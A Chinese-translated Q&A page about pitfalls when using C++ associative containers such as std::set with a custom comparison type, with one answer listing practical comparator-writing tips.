> 赞同：1
> 
> 时间：2012-09-25T17:27:10.780

使用正确的类型`result`，你应该得到一个非字符串的整数。

# c++ - 使用具有自定义比较类型的关联容器的问题

> ID：12587995
> 
> 赞同：0
> 
> 时间：2012-09-25T17:21:54.720
> 
> 标签：c++, stl

这是一个例子：

```
std::set<std::string, SpecialCompareLess> setSpecial; 
```

我记得当我们定义一个自定义比较类型的关联容器时，我们需要注意一些潜在的问题。但是我忘记了问题是什么。

比如：如果你在关联容器上使用 STL 算法，你必须提供这样一个专门的比较器，而不是让算法选择默认的比较器。否则，您将无法获得正确的结果。

如果有人知道我在说什么，你能提醒我关注的是什么吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-20T11:23:08.940

这样的问题很多，很多都很难概括，所以没有一个共同的参考。但根据我自己的经验，我可以告诉你几个最常见和最有用的： 1\. 如你所知，比较函数可以是任何可调用类型（函子、lambda、函数引用等）。但始终使用仿函数或 lambda，因为编译器总是内联它们，因此您可以获得更好的性能。2\. 不要忘记将比较器的参数声明为 const 引用。3\. 如果您总是可以编写 apaptors 来封装您的 comaprator 大代码 4\. 尝试将您的比较器编写为 FP 中的纯函数。5\. 如果您的容器由指针组成，您必须编写自己的比较器，因为默认比较器将对指针值进行排序，而不是取消引用它们。6\. 记住相等和等价之间的数学差异，以便编写正确的比较器返回类型（例如 false 表示相等）。您还可以在 Musser、Meyers 和 Herb Sutter 的书中找到一些这样的建议。